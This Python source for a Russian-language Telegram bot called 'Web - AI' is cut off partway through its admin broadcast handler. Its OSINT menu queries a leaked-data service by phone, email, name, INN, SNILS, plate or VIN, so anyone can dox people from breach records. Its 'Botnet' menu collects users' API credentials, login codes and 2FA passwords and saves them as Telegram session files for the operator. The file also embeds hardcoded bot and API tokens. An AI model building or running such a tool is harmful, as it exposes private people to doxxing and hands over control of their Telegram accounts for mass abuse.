import json
import os
import telebot
import time
import requests
import html
import random
import asyncio
import string
from datetime import datetime, timedelta
from telethon import TelegramClient
from telethon.errors import FloodWaitError, SessionPasswordNeededError, PhoneCodeInvalidError, PhoneNumberInvalidError
from pathlib import Path

owner = 87560475
web_bot = "8533871351:AAHtnasSphSDQKmCyNY1iu0gpQntivex24s"
CHANNEL_ID = -1003277707197
API_TOKEN = "5221650154:D9g4M7Ti"

bot = telebot.TeleBot(web_bot, threaded=False)

print("🔄 Установка завершена! Запускаю бота...")

files = ['user.json', 'sub.json', 'ban.json', 'ref.json']
for file in files:
    if not os.path.exists(file):
        with open(file, 'w') as f:
            json.dump({}, f)

SESSIONS_DIR = 'botnet_sessions'
if not os.path.exists(SESSIONS_DIR):
    os.makedirs(SESSIONS_DIR)

def load_json(filename):
    try:
        with open(filename, 'r') as f:
            data = json.load(f)
            if filename == 'user.json':
                for key, value in data.items():
                    if isinstance(value, bool):
                        data[key] = {"phone": None, "subscribed": False}
                    elif isinstance(value, str):
                        data[key] = {"phone": value, "subscribed": False}
            return data
    except:
        return {}

def save_json(filename, data):
    with open(filename, 'w') as f:
        json.dump(data, f)

def save_user(user_id, phone=None):
    users = load_json('user.json')
    user_id_str = str(user_id)
    
    if user_id_str not in users:
        users[user_id_str] = {"phone": phone, "subscribed": False}
    else:
        if not isinstance(users[user_id_str], dict):
            users[user_id_str] = {"phone": None, "subscribed": False}
        if phone:
            users[user_id_str]["phone"] = phone
    
    save_json('user.json', users)

def check_user_status(user_id):
    try:
        user_id_str = str(user_id)
        users = load_json('user.json')
        
        if user_id_str not in users:
            return False
            
        user_data = users[user_id_str]
        if not isinstance(user_data, dict):
            return False
            
        has_phone = user_data.get("phone") is not None
        is_subscribed = user_data.get("subscribed", False)
        
        if has_phone and is_subscribed:
            return True
        return False
    except:
        return False

def check_subscription(user_id):
    subs = load_json('sub.json')
    user_id_str = str(user_id)
    if user_id_str in subs:
        return True
    return False

def update_subscription_status(user_id, status):
    users = load_json('user.json')
    user_id_str = str(user_id)
    if user_id_str in users:
        if not isinstance(users[user_id_str], dict):
            users[user_id_str] = {"phone": None, "subscribed": False}
        users[user_id_str]["subscribed"] = status
        save_json('user.json', users)

def get_subscription_markup():
    markup = telebot.types.InlineKeyboardMarkup()
    row = [
        telebot.types.InlineKeyboardButton("Подписаться", url="https://t.me/+EUs_RMUz9EtlMGE0"),
        telebot.types.InlineKeyboardButton("Подтвердить", callback_data='verify_phone'),
        telebot.types.InlineKeyboardButton("Проверить", callback_data='check_status')
    ]
    markup.row(*row)
    return markup

def get_phone_markup():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(telebot.types.KeyboardButton("Подтвердить", request_contact=True))
    return markup

def get_profile_text(user_data):
    users = load_json('user.json')
    bans = load_json('ban.json')
    subs = load_json('sub.json')
    refs = load_json('ref.json')
    
    user_ref_count = 0
    user_ref_id = str(user_data.id)
    
    if user_ref_id in refs:
        user_ref_count = len(refs[user_ref_id])
    
    user_phone = users.get(user_ref_id, {}).get("phone", "Не указан")
    
    first_name = html.escape(user_data.first_name or "Не указан")
    username = html.escape(f"@{user_data.username}" if user_data.username else "Не указан")
    
    return f'''<b><i>Информация о вашем профиле и статистика бота.</i></b>

<b>Ник нейм</b>: <code>{first_name}</code>
<b>Юзернейм</b>: <code>{username}</code>
<b>ID</b>: <code>{user_data.id}</code>
<b>Телефон</b>: <code>{user_phone}</code>

<b>Кол-во запросов OSINT</b>: <code>0</code>
<b>Кол-во запросов Botnet</b>: <code>0</code>
<b>Кол-во запросов AI</b>: <code>0</code>

<b>Рефералов</b>: <code>{user_ref_count}</code>
<b>Подписка</b>: <code>{"активна" if str(user_data.id) in subs else "не активна"}</code>
<b>Баланс</b>: <code>0</code>

<b>Кол-во пользователей бота</b>: <code>{len(users)}</code>
<b>Кол-во купивших подписку</b>: <code>{len(subs)}</code>
<b>Кол-во забаненых админом</b>: <code>{len(bans)}</code>

<b>Реферальная ссылка</b>: <code>https://t.me/Web_AI_root_bot?start={user_data.id}</code>'''

def get_main_markup(user_id):
    markup = telebot.types.InlineKeyboardMarkup()
    row1 = [
        telebot.types.InlineKeyboardButton("🔍 OSINT", callback_data='osint_menu'),
        telebot.types.InlineKeyboardButton("💣 Botnet", callback_data='botnet_menu'),
        telebot.types.InlineKeyboardButton("🤖 AI", callback_data='ai_menu')
    ]
    row2 = [
        telebot.types.InlineKeyboardButton("🧧 Profile", callback_data='profile_menu'),
        telebot.types.InlineKeyboardButton("💲 Crypto", callback_data='crypto'),
        telebot.types.InlineKeyboardButton("💳 Card", callback_data='card')
    ]
    markup.row(*row1)
    markup.row(*row2)
    
    if user_id == owner:
        row3 = [telebot.types.InlineKeyboardButton("💻 Admin", callback_data='admin')]
        markup.row(*row3)
    
    return markup

def get_crypto_markup():
    markup = telebot.types.InlineKeyboardMarkup()
    
    row1 = [
        telebot.types.InlineKeyboardButton("1 неделя", url="https://t.me/send?start=IVuF0HpIaXXu"),
        telebot.types.InlineKeyboardButton("1 месяц", url="https://t.me/send?start=IVHvxstS6a4v"),
        telebot.types.InlineKeyboardButton("2 месяца", url="https://t.me/send?start=IVoeSkLDfpBh")
    ]
    
    row2 = [
        telebot.types.InlineKeyboardButton("4 месяца", url="https://t.me/send?start=IVvDkRjHVyTc"),
        telebot.types.InlineKeyboardButton("1 год", url="https://t.me/send?start=IVI53FmncjJz"),
        telebot.types.InlineKeyboardButton("Навсгда", url="https://t.me/send?start=IVntCWhUqzm1")
    ]
    
    row3 = [
        telebot.types.InlineKeyboardButton("🔙Главное меню", callback_data='crypto_back')
    ]
    
    markup.row(*row1)
    markup.row(*row2)
    markup.row(*row3)
    
    return markup

def get_card_markup():
    markup = telebot.types.InlineKeyboardMarkup()
    
    row1 = [
        telebot.types.InlineKeyboardButton("🪪Оплатить", url="https://t.me/root_exorcist"),
        telebot.types.InlineKeyboardButton("🔙 Назад", callback_data='main_menu')
    ]
    
    markup.row(*row1)
    
    return markup

def get_osint_markup():
    markup = telebot.types.InlineKeyboardMarkup()
    row1 = [
        telebot.types.InlineKeyboardButton("📱 Телефон", callback_data='phone_osint'),
        telebot.types.InlineKeyboardButton("📧 Почта", callback_data='email_osint'),
        telebot.types.InlineKeyboardButton("👤 ФИО", callback_data='name_osint')
    ]
    row2 = [
        telebot.types.InlineKeyboardButton("📄 ИНН", callback_data='inn_osint'),
        telebot.types.InlineKeyboardButton("🆔 СНИЛС", callback_data='snils_osint'),
        telebot.types.InlineKeyboardButton("🌐 IP", callback_data='ip_osint')
    ]
    row3 = [
        telebot.types.InlineKeyboardButton("🚗 Номер", callback_data='plate_osint'),
        telebot.types.InlineKeyboardButton("🔧 VIN", callback_data='vin_osint'),
        telebot.types.InlineKeyboardButton("📱 Соцсети", callback_data='social_osint')
    ]
    row4 = [telebot.types.InlineKeyboardButton("🔙 Назад", callback_data='main_menu')]
    
    markup.row(*row1)
    markup.row(*row2)
    markup.row(*row3)
    markup.row(*row4)
    
    return markup

def get_osint_results_markup(query_id, page=0, total_pages=1):
    markup = telebot.types.InlineKeyboardMarkup()
    row = []
    
    if page > 0:
        row.append(telebot.types.InlineKeyboardButton("⬅️ Назад", callback_data=f'osint_page_{query_id}_{page-1}'))
    
    row.append(telebot.types.InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data='current_page'))
    
    if page < total_pages - 1:
        row.append(telebot.types.InlineKeyboardButton("Вперед ➡️", callback_data=f'osint_page_{query_id}_{page+1}'))
    
    markup.row(*row)
    markup.row(telebot.types.InlineKeyboardButton("🔙 Главное меню", callback_data='main_menu'))
    
    return markup

def get_botnet_markup():
    markup = telebot.types.InlineKeyboardMarkup()
    row1 = [
        telebot.types.InlineKeyboardButton("👤 Аккаунт", callback_data='account_botnet'),
        telebot.types.InlineKeyboardButton("👥 Группу", callback_data='group_botnet'),
        telebot.types.InlineKeyboardButton("📢 Канал", callback_data='channel_botnet')
    ]
    row2 = [
        telebot.types.InlineKeyboardButton("💬 Форум", callback_data='forum_botnet'),
        telebot.types.InlineKeyboardButton("🔐 Сессию", callback_data='session_botnet'),
        telebot.types.InlineKeyboardButton("📞 Контакт", url="https://t.me/root_exorcist")
    ]
    row3 = [telebot.types.InlineKeyboardButton("🔙 Назад", callback_data='main_menu')]
    
    markup.row(*row1)
    markup.row(*row2)
    markup.row(*row3)
    
    return markup

def get_add_session_markup():
    markup = telebot.types.InlineKeyboardMarkup()
    row = [
        telebot.types.InlineKeyboardButton("Назад", callback_data='main_menu'),
        telebot.types.InlineKeyboardButton("Документация", url="https://telegra.ph/Polnaya-dokumentaciya-po-polucheniyu-API-ID-i-API-HASH-dlya-Telegram-01-17")
    ]
    markup.row(*row)
    return markup

def get_code_input_markup():
    markup = telebot.types.InlineKeyboardMarkup()
    
    row1 = [
        telebot.types.InlineKeyboardButton("1", callback_data='code_1'),
        telebot.types.InlineKeyboardButton("2", callback_data='code_2'),
        telebot.types.InlineKeyboardButton("3", callback_data='code_3')
    ]
    row2 = [
        telebot.types.InlineKeyboardButton("4", callback_data='code_4'),
        telebot.types.InlineKeyboardButton("5", callback_data='code_5'),
        telebot.types.InlineKeyboardButton("6", callback_data='code_6')
    ]
    row3 = [
        telebot.types.InlineKeyboardButton("7", callback_data='code_7'),
        telebot.types.InlineKeyboardButton("8", callback_data='code_8'),
        telebot.types.InlineKeyboardButton("9", callback_data='code_9')
    ]
    row4 = [
        telebot.types.InlineKeyboardButton("0", callback_data='code_0'),
        telebot.types.InlineKeyboardButton("⌫ Удалить", callback_data='code_delete'),
        telebot.types.InlineKeyboardButton("✅ Готово", callback_data='code_submit')
    ]
    row5 = [
        telebot.types.InlineKeyboardButton("🔄 Отправить новый код", callback_data='code_resend')
    ]
    
    markup.row(*row1)
    markup.row(*row2)
    markup.row(*row3)
    markup.row(*row4)
    markup.row(*row5)
    
    return markup

def get_ai_markup():
    markup = telebot.types.InlineKeyboardMarkup()
    row1 = [
        telebot.types.InlineKeyboardButton("🌀 Serenity", callback_data='serenity_ai'),
        telebot.types.InlineKeyboardButton("🤖 Open AI", callback_data='openai_ai'),
        telebot.types.InlineKeyboardButton("🧠 Anthropic", callback_data='anthropic_ai')
    ]
    row2 = [
        telebot.types.InlineKeyboardButton("🔍 DeepSeek", callback_data='deepseek_ai'),
        telebot.types.InlineKeyboardButton("🌐 Yandex", callback_data='yandex_ai'),
        telebot.types.InlineKeyboardButton("🔵 Google", callback_data='google_ai')
    ]
    row3 = [telebot.types.InlineKeyboardButton("🔙 Назад", callback_data='main_menu')]
    
    markup.row(*row1)
    markup.row(*row2)
    markup.row(*row3)
    
    return markup

def get_profile_markup():
    markup = telebot.types.InlineKeyboardMarkup()
    row1 = [
        telebot.types.InlineKeyboardButton("🔄 Обновить", callback_data='refresh_profile'),
        telebot.types.InlineKeyboardButton("🔙 Главное меню", callback_data='main_menu')
    ]
    markup.row(*row1)
    return markup

def get_admin_markup():
    markup = telebot.types.InlineKeyboardMarkup()
    row1 = [
        telebot.types.InlineKeyboardButton("Выдать", callback_data='admin_give'),
        telebot.types.InlineKeyboardButton("Отобрать", callback_data='admin_take'),
        telebot.types.InlineKeyboardButton("Бан", callback_data='admin_ban')
    ]
    row2 = [
        telebot.types.InlineKeyboardButton("Рассылка", callback_data='admin_broadcast'),
        telebot.types.InlineKeyboardButton("Главное меню", callback_data='main_menu')
    ]
    markup.row(*row1)
    markup.row(*row2)
    return markup

user_states = {}
osint_results = {}

def format_osint_results(data, query, query_type, page=0):
    if not data or not isinstance(data, dict):
        return "❌ Данные не найдены или произошла ошибка при поиске.", 1
    
    if "Error code" in data:
        return f"❌ Ошибка API: {data['Error code']}", 1
    
    if "List" not in data:
        return "❌ Некорректный ответ от API.", 1
    
    lines = []
    
    if query_type == 'phone':
        lines.append(f"<b>Результаты поиска по номеру:</b> <code>{html.escape(str(query))}</code>\n")
    elif query_type == 'email':
        lines.append(f"<b>Результаты поиска по почте:</b> <code>{html.escape(str(query))}</code>\n")
    elif query_type == 'name':
        lines.append(f"<b>Результаты поиска по ФИО:</b> <code>{html.escape(str(query))}</code>\n")
    elif query_type == 'inn':
        lines.append(f"<b>Результаты поиска по ИНН:</b> <code>{html.escape(str(query))}</code>\n")
    elif query_type == 'snils':
        lines.append(f"<b>Результаты поиска по СНИЛС:</b> <code>{html.escape(str(query))}</code>\n")
    elif query_type == 'ip':
        lines.append(f"<b>Результаты поиска по IP:</b> <code>{html.escape(str(query))}</code>\n")
    elif query_type == 'plate':
        lines.append(f"<b>Результаты поиска по номеру авто:</b> <code>{html.escape(str(query))}</code>\n")
    elif query_type == 'vin':
        lines.append(f"<b>Результаты поиска по VIN:</b> <code>{html.escape(str(query))}</code>\n")
    elif query_type == 'social':
        lines.append(f"<b>Результаты поиска в соцсетях:</b> <code>{html.escape(str(query))}</code>\n")
    
    database_list = list(data["List"].items())
    total_items = len(database_list)
    
    if total_items == 0:
        lines.append("❌ По данному запросу ничего не найдено.")
        return "\n".join(lines), 1
    
    total_pages = total_items
    if page >= total_pages:
        page = total_pages - 1
    
    if page < len(database_list):
        database_name, database_data = database_list[page]
        
        if "checko" in database_name.lower() or "Checko" in database_name:
            lines.append(f"<b>{html.escape(database_name)}</b>\n")
            
            if "InfoLeak" in database_data:
                lines.append(f"{html.escape(database_data['InfoLeak'])}\n")
            
            if "Data" in database_data and database_data["Data"]:
                for i, report_data in enumerate(database_data["Data"]):
                    lines.append(f"<b>Запись #{i+1}</b>")
                    for column_name, column_value in report_data.items():
                        safe_key = html.escape(str(column_name))
                        safe_value = html.escape(str(column_value))
                        lines.append(f"<b>{safe_key}:</b> <code>{safe_value}</code>")
                    if i < len(database_data["Data"]) - 1:
                        lines.append("")
            else:
                lines.append("❌ В этой базе данных не найдено записей.")
        else:
            if "InfoLeak" in database_data:
                lines.append(f"{html.escape(database_data['InfoLeak'])}\n")
            
            if "Data" in database_data and database_data["Data"]:
                lines.append(f"<b>{html.escape(database_name)}</b>\n")
                
                all_columns = {}
                for report_data in database_data["Data"]:
                    for column_name, column_value in report_data.items():
                        if column_name in all_columns:
                            all_columns[column_name] += f", {column_value}"
                        else:
                            all_columns[column_name] = str(column_value)
                
                column_items = list(all_columns.items())
                for i, (column_name, column_value) in enumerate(column_items):
                    safe_key = html.escape(str(column_name))
                    safe_value = html.escape(str(column_value))
                    
                    if i == len(column_items) - 1:
                        lines.append(f"└─<b>{safe_key}: </b> <code>{safe_value}.</code>")
                    else:
                        lines.append(f"├─<b>{safe_key}: </b> <code>{safe_value}.</code>")
            else:
                lines.append(f"<b>{html.escape(database_name)}</b>")
                lines.append("❌ В этой базе данных не найдено записей.")
    
    result_text = "\n".join(lines)
    if len(result_text) > 4000:
        result_text = result_text[:4000] + "\n\n⚠️ Результаты обрезаны из-за ограничения длины сообщения."
    
    return result_text, total_pages

def search_osint(query, search_type):
    try:
        data = {
            "token": API_TOKEN, 
            "request": query, 
            "limit": 100, 
            "lang": "ru",
            "type": "json"
        }
        url = 'https://leakosintapi.com/'
        response = requests.post(url, json=data, timeout=30)
        
        if response.status_code == 200:
            return response.json()
        else:
            return {"Error code": f"HTTP error: {response.status_code}"}
    except requests.exceptions.Timeout:
        return {"Error code": "Таймаут запроса"}
    except Exception as e:
        return {"Error code": f"Request error: {str(e)}"}

async def create_telethon_session(user_id, api_id, api_hash, phone_number, code=None, phone_code_hash=None, request_new_code=False):
    try:
        session_name = f"{SESSIONS_DIR}/{user_id}_{int(time.time())}.session"
        client = TelegramClient(session_name, int(api_id), api_hash)
        
        await client.connect()
        
        if not await client.is_user_authorized():
            if code is None or request_new_code:
                sent_code = await client.send_code_request(phone_number)
                return {"status": "code_required", "phone_code_hash": sent_code.phone_code_hash}
            
            try:
                await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)
            except SessionPasswordNeededError:
                return {"status": "2fa_required"}
            except PhoneCodeInvalidError:
                return {"status": "invalid_code"}
        
        await client.disconnect()
        return {"status": "success", "session_file": session_name}
        
    except PhoneNumberInvalidError:
        return {"status": "invalid_phone"}
    except FloodWaitError as e:
        return {"status": "flood_wait", "seconds": e.seconds}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def async_create_session(user_id, api_id, api_hash, phone_number, chat_id, msg_id):
    async def task():
        result = await create_telethon_session(user_id, api_id, api_hash, phone_number)
        
        if result['status'] == 'code_required':
            user_states[user_id]['phone_code_hash'] = result['phone_code_hash']
            user_states[user_id]['action'] = 'add_session_step4'
            user_states[user_id]['entered_code'] = ''
            
            msg = bot.send_message(
                chat_id,
                "Введите 5-значный код с помощью кнопок ниже:\n\n📱 Код: _____",
                reply_markup=get_code_input_markup()
            )
            user_states[user_id]['code_message_id'] = msg.message_id
            
            try:
                bot.delete_message(chat_id, msg_id)
            except:
                pass
            
        elif result['status'] == 'flood_wait':
            bot.edit_message_text(f"⏳ Подождите {result['seconds']} секунд перед следующей попыткой", chat_id, msg_id)
            del user_states[user_id]
        else:
            bot.edit_message_text(f"❌ Ошибка: {result.get('message', 'Неизвестная ошибка')}", chat_id, msg_id)
            del user_states[user_id]
    
    asyncio.run(task())

def async_resend_code(user_id, api_id, api_hash, phone_number, chat_id, msg_id, code_msg_id):
    async def task():
        result = await create_telethon_session(user_id, api_id, api_hash, phone_number, request_new_code=True)
        
        if result['status'] == 'code_required':
            user_states[user_id]['phone_code_hash'] = result['phone_code_hash']
            user_states[user_id]['entered_code'] = ''
            
            try:
                bot.edit_message_text(
                    "✅ Новый код отправлен!\n\nВведите 5-значный код с помощью кнопок ниже:\n\n📱 Код: _____",
                    chat_id,
                    code_msg_id,
                    reply_markup=get_code_input_markup()
                )
            except:
                msg = bot.send_message(
                    chat_id,
                    "✅ Новый код отправлен!\n\nВведите 5-значный код с помощью кнопок ниже:\n\n📱 Код: _____",
                    reply_markup=get_code_input_markup()
                )
                user_states[user_id]['code_message_id'] = msg.message_id
            
            try:
                bot.delete_message(chat_id, msg_id)
            except:
                pass
            
        elif result['status'] == 'flood_wait':
            bot.edit_message_text(f"⏳ Подождите {result['seconds']} секунд перед следующей попыткой", chat_id, msg_id)
        else:
            bot.edit_message_text(f"❌ Ошибка: {result.get('message', 'Неизвестная ошибка')}", chat_id, msg_id)
    
    asyncio.run(task())

def async_verify_code(user_id, api_id, api_hash, phone_number, code, phone_code_hash, chat_id, msg_id):
    async def task():
        result = await create_telethon_session(user_id, api_id, api_hash, phone_number, code, phone_code_hash)
        
        if result['status'] == 'success':
            bot.edit_message_text(f"✅ Сессия успешно создана!\n\nФайл сессии: {result['session_file']}", chat_id, msg_id)
            del user_states[user_id]
        elif result['status'] == '2fa_required':
            user_states[user_id]['action'] = 'add_session_step5'
            bot.edit_message_text("🔐 Требуется 2FA пароль. Введите пароль двухфакторной аутентификации:", chat_id, msg_id)
        elif result['status'] == 'invalid_code':
            if "expired" in result.get('message', '').lower():
                bot.edit_message_text("❌ Код истек. Нажмите '🔄 Отправить новый код'", chat_id, msg_id)
            else:
                bot.edit_message_text("❌ Неверный код. Попробуйте еще раз:", chat_id, msg_id)
        else:
            bot.edit_message_text(f"❌ Ошибка: {result.get('message', 'Неизвестная ошибка')}", chat_id, msg_id)
            del user_states[user_id]
    
    asyncio.run(task())

def async_verify_2fa(user_id, api_id, api_hash, phone_number, code, password, chat_id, msg_id):
    async def task():
        session_name = f"{SESSIONS_DIR}/{user_id}_{int(time.time())}.session"
        
        try:
            client = TelegramClient(session_name, api_id, api_hash)
            await client.connect()
            
            await client.sign_in(phone_number, code)
            await client.sign_in(password=password)
            
            await client.disconnect()
            
            bot.edit_message_text(f"✅ Сессия успешно создана с 2FA!\n\nФайл сессии: {session_name}", chat_id, msg_id)
            del user_states[user_id]
            
        except Exception as e:
            bot.edit_message_text(f"❌ Ошибка при создании сессии: {str(e)}", chat_id, msg_id)
            del user_states[user_id]
    
    asyncio.run(task())

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    
    bans = load_json('ban.json')
    if str(user_id) in bans:
        bot.send_message(message.chat.id, "вы заблокированы в боте")
        return
    
    if not check_user_status(user_id):
        bot.send_message(
            message.chat.id,
            "`Для того что бы пользоваться ботом, нужно подписаться на канал. и подтвердить номер телефона.`",
            parse_mode='Markdown',
            reply_markup=get_subscription_markup()
        )
        return
    
    save_user(user_id)
    
    if len(message.text.split()) > 1:
        ref_id = message.text.split()[1]
        refs = load_json('ref.json')
        if ref_id != str(message.from_user.id):
            if ref_id not in refs:
                refs[ref_id] = []
            if str(message.from_user.id) not in refs[ref_id]:
                refs[ref_id].append(str(message.from_user.id))
                save_json('ref.json', refs)
    
    try:
        with open('onion.mp4', 'rb') as video:
            bot.send_video(
                message.chat.id, 
                video, 
                caption="""<b><i>
Web - AI: Telegram - бот в котором собраны все необходимые инструменты для osint'еров, pentest'еров, snos'еров и простых пользователей Telegram.

Желаю удачи в использовании!
</i></b>""", 
                parse_mode='HTML', 
                reply_markup=get_main_markup(message.from_user.id)
            )
        
        print(f"✅ Сообщение отправлено пользователю {message.from_user.id}")
    except Exception as e:
        print(f"❌ Ошибка отправки видео: {e}")
        bot.send_message(message.chat.id, "❌ Ошибка загрузки видео. Попробуйте позже.")

@bot.message_handler(func=lambda message: message.from_user.id in user_states and 'osint_type' in user_states[message.from_user.id])
def handle_osint_input(message):
    user_id = message.from_user.id
    state = user_states[user_id]
    
    if not check_subscription(user_id):
        bot.send_message(message.chat.id, "❌ Подписка не активна.")
        del user_states[user_id]
        return
    
    query = message.text.strip()
    search_type = state['osint_type']
    
    bot.send_message(message.chat.id, "🔍 Поиск информации...")
    
    results = search_osint(query, search_type)
    
    if 'Error code' in results:
        bot.send_message(message.chat.id, f"❌ Ошибка: {results['Error code']}")
    else:
        query_id = random.randint(0, 9999999)
        formatted_text, total_pages = format_osint_results(results, query, search_type, page=0)
        
        osint_results[query_id] = {
            'data': results,
            'query': query,
            'type': search_type,
            'total_pages': total_pages
        }
        
        try:
            bot.send_message(
                message.chat.id,
                formatted_text,
                parse_mode='HTML',
                reply_markup=get_osint_results_markup(query_id, page=0, total_pages=total_pages)
            )
        except Exception as e:
            print(f"❌ Ошибка отправки результатов: {e}")
            plain_text = html.unescape(formatted_text.replace("<b>", "").replace("</b>", "").replace("<i>", "").replace("</i>", ""))
            bot.send_message(
                message.chat.id,
                plain_text,
                reply_markup=get_osint_results_markup(query_id, page=0, total_pages=total_pages)
            )
    
    del user_states[user_id]

@bot.message_handler(func=lambda message: message.from_user.id in user_states and user_states[message.from_user.id].get('action', '').startswith('add_session'))
def handle_add_session(message):
    user_id = message.from_user.id
    state = user_states[user_id]
    
    if state['action'] == 'add_session_step1':
        try:
            api_id = int(message.text.strip())
            user_states[user_id] = {'action': 'add_session_step2', 'api_id': api_id}
            bot.send_message(message.chat.id, "✅ API ID принят. Теперь введите API HASH:")
        except ValueError:
            bot.send_message(message.chat.id, "❌ API ID должен быть числом. Введите API ID:")
            
    elif state['action'] == 'add_session_step2':
        api_hash = message.text.strip()
        if len(api_hash) < 10:
            bot.send_message(message.chat.id, "❌ Некорректный API HASH. Введите API HASH:")
            return
        
        user_states[user_id] = {'action': 'add_session_step3', 'api_id': state['api_id'], 'api_hash': api_hash}
        bot.send_message(message.chat.id, "✅ API HASH принят. Теперь введите номер телефона в международном формате (например: +79991234567):")
        
    elif state['action'] == 'add_session_step3':
        phone_number = message.text.strip()
        if not phone_number.startswith('+'):
            bot.send_message(message.chat.id, "❌ Номер должен начинаться с +. Введите номер телефона:")
            return
        
        user_states[user_id] = {'action': 'add_session_step4', 'api_id': state['api_id'], 'api_hash': state['api_hash'], 'phone': phone_number}
        
        msg = bot.send_message(message.chat.id, "🔄 Отправляю код на телефон...")
        
        import threading
        thread = threading.Thread(target=async_create_session, args=(user_id, state['api_id'], state['api_hash'], phone_number, message.chat.id, msg.message_id))
        thread.start()
        
    elif state['action'] == 'add_session_step5':
        password = message.text.strip()
        if len(password) < 1:
            bot.send_message(message.chat.id, "❌ Введите пароль 2FA:")
            return
        
        msg = bot.send_message(message.chat.id, "🔄 Проверяю пароль 2FA...")
        
        import threading
        thread = threading.Thread(target=async_verify_2fa, args=(user_id, state['api_id'], state['api_hash'], state['phone'], 
                                                               state['code'], password, message.chat.id, msg.message_id))
        thread.start()

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    if message.contact:
        phone_number = message.contact.phone_number
        save_user(message.from_user.id, phone_number)
        bot.send_message(message.chat.id, f"✅ Номер телефона сохранен: {phone_number}")
        
        if check_user_status(message.from_user.id):
            bot.send_message(
                message.chat.id,
                "✅ Все условия выполнены! Используйте /start для доступа к боту."
            )
        else:
            bot.send_message(
                message.chat.id,
                "`Теперь подпишитесь на канал и нажмите 'Проверить'`",
                parse_mode='Markdown',
                reply_markup=get_subscription_markup()
            )

@bot.message_handler(func=lambda message: message.from_user.id == owner and user_states.get(message.from_user.id))
def handle_admin_input(message):
    state = user_states.get(message.from_user.id, {})
    
    if state.get('action') == 'give_user_id':
        try:
            user_id = int(message.text)
            user_states[message.from_user.id] = {'action': 'give_function', 'user_id': user_id}
            markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
            markup.add("OSINT", "BOTNET", "AI")
            bot.send_message(message.chat.id, "Выберите функцию:", reply_markup=markup)
        except:
            bot.send_message(message.chat.id, "❌ Неверный ID. Введите числовой ID:")
            
    elif state.get('action') == 'give_function':
        function = message.text.upper()
        if function in ["OSINT", "BOTNET", "AI"]:
            user_states[message.from_user.id] = {'action': 'give_time', 'user_id': state['user_id'], 'function': function}
            bot.send_message(message.chat.id, "Введите время активности подписки (например: 7 дней, 1 месяц):")
        else:
            bot.send_message(message.chat.id, "❌ Неверная функция. Выберите OSINT, BOTNET или AI:")
            
    elif state.get('action') == 'give_time':
        time_period = message.text
        user_id = state['user_id']
        function = state['function']
        
        subs = load_json('sub.json')
        user_id_str = str(user_id)
        
        if user_id_str not in subs:
            subs[user_id_str] = {}
        
        subs[user_id_str][function] = time_period
        save_json('sub.json', subs)
        
        del user_states[message.from_user.id]
        bot.send_message(message.chat.id, f"✅ Пользователю {user_id} выдана подписка на {function} на {time_period}")
        
    elif state.get('action') == 'take_user_id':
        try:
            user_id = int(message.text)
            subs = load_json('sub.json')
            user_id_str = str(user_id)
            
            if user_id_str in subs:
                del subs[user_id_str]
                save_json('sub.json', subs)
                bot.send_message(message.chat.id, f"✅ Подписка у пользователя {user_id} отобрана")
            else:
                bot.send_message(message.chat.id, f"❌ Пользователь {user_id} не найден в подписках")
            
            del user_states[message.from_user.id]
        except:
            bot.send_message(message.chat.id, "❌ Неверный ID. Введите числовой ID:")
            
    elif state.get('action') == 'ban_user_id':
        try:
            user_id = int(message.text)
            bans = load_json('ban.json')
            user_id_str = str(user_id)
            
            if user_id_str not in bans:
                bans[user_id_str] = True
                save_json('ban.json', bans)
                bot.send_message(message.chat.id, f"✅ Пользователь {user_id} забанен")
            else:
                bot.send_message(message.chat.id, f"❌ Пользователь {user_id} уже забанен")
            
            del user_states[message.from_user.id]
        except:
            bot.send_message(message.chat.id, "❌ Неверный ID. Введите числовой ID:")

@bot.message_handler(func=lambda message: message.from_user.id == owner and user_states.get(message.from_user.id, {}).get('action') == 'broadcast_content')
def handle_broadcast_content(message):
    state = user_states[message.from_user.id]
    broadcast_data = state.get('broadcast_data', {})
    
    if message.content_type == 'text':
        broadcast_data['text'] = message.text
    elif message.content_type == 'photo':
        broadcast_data['photo'] = message.photo[-1].file_id
        if message.caption:
            broadcast_data['caption'] = message.caption
    elif message.content_type == 'video':
        broadcast_data['video'] = message.video.file_id
        if message.caption:
            broadcast_data['caption'] = message.caption
    elif message.content_type == 'document':
        broadcast_data['document'] = message.document.file_id
        if message.caption:
            broadcast_data['caption'] = message.caption
    elif message.content_type == 'voice':
        broadcast_data['voice'] = message.voice.file_id
    
    user_states[message.from_user.id]['broadcast_data'] = broadcast_data
    
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add("📤 Отправить рассылку", "❌ Отмена")
    bot.send_message(message.chat.id, "Контент получен. Нажмите '📤 Отправить рассылку' для отправки или '❌ Отмена' для отмены:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.from_user.id == owner and user_states.get(message.from_user.id, {}).get('action') == 'broadcast_confirm')
def handle_broadcast_confirm(message):
    if message.text == "📤 Отправить рассылку":
        broadcast_data = user_states[message.from_user.id].get('broadcast_data', {})
        users = load_json('user.json')
        total = len(users)
        successful = 0
        failed = 0
        
        bot.send_message(message.chat.id, f"📤 Начинаю рассылку для {total} пользователей...")
        
        for user_id_str in users.keys():
            try:
                user_id = int(user_id_str)
                
                if 'photo' in broadcast_data:
                    if 'caption' in broadcast_data:
                        bot.send_photo(user_id, broadcast_data['photo'], caption=broadcast_data['caption'])
                    else:
                        bot.send_photo(user_id, broadcast_data['photo'])
                elif 'video' in broadcast_data:
                    if 'caption' in broadcast_data:
                        bot.send_video(user_id, broadcast_data['video'], caption=broadcast_data['caption'])
                    else:
                        bot.send_video(user_id, broadcast_data['video'])
                elif 'document' in broadcast_data:
                    if 'caption' in broadcast_data:
                        bot.send_document(user_id, broadcast_data['document'], caption=broadcast_data['caption'])
                    else:
                        bot.send_document(user_id, broadcast_data['document'])
                elif 'voice' in broadcast_data:
                    bot.send_voice(user_id, broadcast_data['voice'])
                elif 'text' in broadcast_data:
                    bot.send_message(user_id, broadcast_data['text'])
                
                successful += 1
            except Exception as e:
                failed += 1
            
            time.sleep(0.1)
        
        bot.send_message(message.chat.id, f"✅ Рассылка завершена!\n📊 Статистика:\n👥 Всего: {total}\n✅ Успешно: {successful}\n❌ Неудачно: {failed}")
        
